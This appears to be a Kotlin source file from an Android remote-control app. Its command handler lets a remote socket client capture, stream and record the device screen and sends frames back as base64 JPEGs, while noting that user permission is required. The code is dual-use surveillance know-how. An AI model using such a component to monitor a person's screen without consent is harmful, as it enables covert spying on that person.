package com.remote.system

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.content.ContextCompat
import org.json.JSONException
import org.json.JSONObject
import io.socket.client.Socket
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer
import java.util.concurrent.atomic.AtomicBoolean

class ScreenCommand(private val context: Context) : CommandHandler {
    private val tag = "ScreenCommand"
    
    private var mediaProjectionManager: MediaProjectionManager? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var mediaRecorder: MediaRecorder? = null
    
    private val isStreaming = AtomicBoolean(false)
    private val isRecording = AtomicBoolean(false)
    private var streamingThread: Thread? = null
    private var currentSocket: Socket? = null
    private var currentClientId: String? = null
    
    private val handler = Handler(Looper.getMainLooper())
    
    // Screen configuration
    private var screenWidth = 720
    private var screenHeight = 1280
    private var screenDpi = 320

    init {
        mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        setupScreenDimensions()
    }

    override fun execute(params: JSONObject, clientId: String, socket: Socket) {
        val action = params.optString("action", "start_stream")
        
        when (action) {
            "start_stream" -> startScreenStream(params, clientId, socket)
            "stop_stream" -> stopScreenStream(clientId, socket)
            "capture" -> captureScreen(params, clientId, socket)
            "start_recording" -> startScreenRecording(params, clientId, socket)
            "stop_recording" -> stopScreenRecording(clientId, socket)
            "get_screen_info" -> getScreenInfo(clientId, socket)
            else -> sendErrorResponse("Unknown action: $action", clientId, socket)
        }
    }

    private fun startScreenStream(params: JSONObject, clientId: String, socket: Socket) {
        if (isStreaming.get()) {
            sendErrorResponse("Screen stream already active", clientId, socket)
            return
        }

        try {
            val quality = params.optString("quality", "medium") // low, medium, high
            val fps = params.optInt("fps", 5) // Frames per second
            
            currentSocket = socket
            currentClientId = clientId
            
            // Note: In a real implementation, you would need to get MediaProjection permission
            // This requires user interaction and can't be done automatically
            sendPermissionRequiredResponse(clientId, socket, "screen_stream")

        } catch (e: Exception) {
            Log.e(tag, "Error starting screen stream", e)
            sendErrorResponse("Failed to start screen stream: ${e.message}", clientId, socket)
        }
    }

    private fun stopScreenStream(clientId: String, socket: Socket) {
        try {
            stopStreaming()

            val response = JSONObject()
            response.put("success", true)
            response.put("command", "screen")
            response.put("action", "stop_stream")
            response.put("clientId", clientId)
            socket.emit("command-response", response)

            Log.d(tag, "Screen stream stopped successfully")

        } catch (e: Exception) {
            Log.e(tag, "Error stopping screen stream", e)
            sendErrorResponse("Failed to stop screen stream: ${e.message}", clientId, socket)
        }
    }

    private fun captureScreen(params: JSONObject, clientId: String, socket: Socket) {
        try {
            val quality = params.optInt("quality", 80)
            
            // Note: This would require MediaProjection permission
            sendPermissionRequiredResponse(clientId, socket, "screen_capture")

        } catch (e: Exception) {
            Log.e(tag, "Error capturing screen", e)
            sendErrorResponse("Failed to capture screen: ${e.message}", clientId, socket)
        }
    }

    private fun startScreenRecording(params: JSONObject, clientId: String, socket: Socket) {
        if (isRecording.get()) {
            sendErrorResponse("Screen recording already active", clientId, socket)
            return
        }

        try {
            val duration = params.optInt("duration", 30000) // Default 30 seconds
            val quality = params.optString("quality", "medium")
            
            // Note: This would require MediaProjection permission
            sendPermissionRequiredResponse(clientId, socket, "screen_recording")

        } catch (e: Exception) {
            Log.e(tag, "Error starting screen recording", e)
            sendErrorResponse("Failed to start screen recording: ${e.message}", clientId, socket)
        }
    }

    private fun stopScreenRecording(clientId: String, socket: Socket) {
        try {
            if (!isRecording.get()) {
                sendErrorResponse("No screen recording active", clientId, socket)
                return
            }

            stopRecording()

            val response = JSONObject()
            response.put("success", true)
            response.put("command", "screen")
            response.put("action", "stop_recording")
            response.put("clientId", clientId)
            socket.emit("command-response", response)

            Log.d(tag, "Screen recording stopped successfully")

        } catch (e: Exception) {
            Log.e(tag, "Error stopping screen recording", e)
            sendErrorResponse("Failed to stop screen recording: ${e.message}", clientId, socket)
        }
    }

    private fun getScreenInfo(clientId: String, socket: Socket) {
        try {
            val response = JSONObject()
            val data = JSONObject()
            
            data.put("width", screenWidth)
            data.put("height", screenHeight)
            data.put("dpi", screenDpi)
            data.put("isStreaming", isStreaming.get())
            data.put("isRecording", isRecording.get())
            data.put("permissionRequired", true) // MediaProjection always requires permission

            response.put("success", true)
            response.put("data", data)
            response.put("command", "screen")
            response.put("action", "get_screen_info")
            response.put("clientId", clientId)

            socket.emit("command-response", response)
            Log.d(tag, "Screen info sent successfully")

        } catch (e: Exception) {
            Log.e(tag, "Error getting screen info", e)
            sendErrorResponse("Failed to get screen info: ${e.message}", clientId, socket)
        }
    }

    // This method would be called after receiving MediaProjection permission
    fun startStreamingWithPermission(data: Intent, quality: String, fps: Int, clientId: String, socket: Socket) {
        try {
            mediaProjection = mediaProjectionManager?.getMediaProjection(Activity.RESULT_OK, data)
            
            if (mediaProjection == null) {
                sendErrorResponse("Failed to get media projection", clientId, socket)
                return
            }

            setupImageReader(quality)
            createVirtualDisplay()
            
            isStreaming.set(true)
            startStreamingFrames(fps, clientId, socket)

            // Send stream start confirmation
            val startResponse = JSONObject()
            startResponse.put("success", true)
            startResponse.put("command", "screen")
            startResponse.put("action", "stream_started")
            startResponse.put("clientId", clientId)
            socket.emit("command-response", startResponse)

        } catch (e: Exception) {
            Log.e(tag, "Error starting streaming with permission", e)
            sendErrorResponse("Failed to start streaming: ${e.message}", clientId, socket)
        }
    }

    // This method would be called after receiving MediaProjection permission for recording
    fun startRecordingWithPermission(data: Intent, duration: Int, quality: String, clientId: String, socket: Socket) {
        try {
            mediaProjection = mediaProjectionManager?.getMediaProjection(Activity.RESULT_OK, data)
            
            if (mediaProjection == null) {
                sendErrorResponse("Failed to get media projection", clientId, socket)
                return
            }

            setupMediaRecorder(quality)
            createVirtualDisplayForRecording()
            
            isRecording.set(true)
            mediaRecorder?.start()

            // Auto-stop after duration
            handler.postDelayed({
                stopRecording()
                
                val response = JSONObject()
                response.put("success", true)
                response.put("command", "screen")
                response.put("action", "recording_completed")
                response.put("clientId", clientId)
                socket.emit("command-response", response)
                
            }, duration.toLong())

            // Send recording start confirmation
            val startResponse = JSONObject()
            startResponse.put("success", true)
            startResponse.put("command", "screen")
            startResponse.put("action", "recording_started")
            startResponse.put("clientId", clientId)
            socket.emit("command-response", startResponse)

        } catch (e: Exception) {
            Log.e(tag, "Error starting recording with permission", e)
            sendErrorResponse("Failed to start recording: ${e.message}", clientId, socket)
        }
    }

    private fun setupScreenDimensions() {
        try {
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val displayMetrics = DisplayMetrics()
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                context.display?.getRealMetrics(displayMetrics)
            } else {
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay.getRealMetrics(displayMetrics)
            }
            
            screenWidth = displayMetrics.widthPixels
            screenHeight = displayMetrics.heightPixels
            screenDpi = displayMetrics.densityDpi
            
            // Scale down for better performance
            screenWidth = (screenWidth * 0.6).toInt()
            screenHeight = (screenHeight * 0.6).toInt()
            
        } catch (e: Exception) {
            Log.e(tag, "Error setting up screen dimensions", e)
        }
    }

    private fun setupImageReader(quality: String) {
        val format = PixelFormat.RGBA_8888
        imageReader = ImageReader.newInstance(screenWidth, screenHeight, format, 2)
        
        imageReader?.setOnImageAvailableListener({ reader ->
            if (isStreaming.get()) {
                val image = reader.acquireLatestImage()
                image?.let {
                    processScreenImage(it, quality)
                    it.close()
                }
            }
        }, null)
    }

    private fun setupMediaRecorder(quality: String) {
        val outputFile = File(context.getExternalFilesDir(null), "screen_recording_${System.currentTimeMillis()}.mp4")
        
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }
        
        mediaRecorder?.apply {
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setVideoSize(screenWidth, screenHeight)
            setVideoFrameRate(30)
            setVideoBitRate(when (quality) {
                "low" -> 1000000
                "medium" -> 2000000
                "high" -> 5000000
                else -> 2000000
            })
            setOutputFile(outputFile.absolutePath)
            prepare()
        }
    }

    private fun createVirtualDisplay() {
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenStream",
            screenWidth, screenHeight, screenDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, null
        )
    }

    private fun createVirtualDisplayForRecording() {
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenRecording",
            screenWidth, screenHeight, screenDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            mediaRecorder?.surface, null, null
        )
    }

    private fun startStreamingFrames(fps: Int, clientId: String, socket: Socket) {
        streamingThread = Thread {
            val frameInterval = 1000 / fps
            
            while (isStreaming.get()) {
                try {
                    Thread.sleep(frameInterval.toLong())
                } catch (e: InterruptedException) {
                    break
                }
            }
        }
        streamingThread?.start()
    }

    private fun processScreenImage(image: Image, quality: String) {
        try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * screenWidth

            val bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)

            // Compress bitmap to JPEG
            val outputStream = ByteArrayOutputStream()
            val qualityInt = when (quality) {
                "low" -> 30
                "medium" -> 60
                "high" -> 90
                else -> 60
            }
            bitmap.compress(Bitmap.CompressFormat.JPEG, qualityInt, outputStream)
            bitmap.recycle()

            val imageBytes = outputStream.toByteArray()
            val base64Data = Base64.encodeToString(imageBytes, Base64.DEFAULT)

            currentSocket?.let { socket ->
                currentClientId?.let { clientId ->
                    val response = JSONObject()
                    val data = JSONObject()
                    data.put("imageData", base64Data)
                    data.put("imageSize", imageBytes.size)
                    data.put("width", screenWidth)
                    data.put("height", screenHeight)
                    data.put("timestamp", System.currentTimeMillis())

                    response.put("success", true)
                    response.put("data", data)
                    response.put("command", "screen")
                    response.put("action", "stream_frame")
                    response.put("clientId", clientId)

                    socket.emit("command-response", response)
                }
            }

        } catch (e: Exception) {
            Log.e(tag, "Error processing screen image", e)
        }
    }

    private fun stopStreaming() {
        isStreaming.set(false)
        streamingThread?.interrupt()
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        
        streamingThread = null
        virtualDisplay = null
        imageReader = null
        mediaProjection = null
        currentSocket = null
        currentClientId = null
    }

    private fun stopRecording() {
        if (isRecording.get()) {
            isRecording.set(false)
            
            try {
                mediaRecorder?.stop()
                mediaRecorder?.release()
            } catch (e: Exception) {
                Log.e(tag, "Error stopping media recorder", e)
            }
            
            virtualDisplay?.release()
            mediaProjection?.stop()
            
            mediaRecorder = null
            virtualDisplay = null
            mediaProjection = null
        }
    }

    private fun sendPermissionRequiredResponse(clientId: String, socket: Socket, action: String) {
        try {
            val response = JSONObject()
            response.put("success", false)
            response.put("error", "MediaProjection permission required")
            response.put("permissionRequired", true)
            response.put("permissionType", "MEDIA_PROJECTION")
            response.put("command", "screen")
            response.put("action", action)
            response.put("clientId", clientId)
            response.put("message", "User must grant screen capture permission through device UI")
            socket.emit("command-response", response)
        } catch (e: JSONException) {
            Log.e(tag, "Error sending permission required response", e)
        }
    }

    private fun sendErrorResponse(error: String, clientId: String, socket: Socket) {
        try {
            val errorResponse = JSONObject()
            errorResponse.put("success", false)
            errorResponse.put("error", error)
            errorResponse.put("command", "screen")
            errorResponse.put("clientId", clientId)
            socket.emit("command-response", errorResponse)
        } catch (e: JSONException) {
            Log.e(tag, "Error sending error response", e)
        }
    }

    // Clean up resources
    fun cleanup() {
        stopStreaming()
        stopRecording()
    }
}
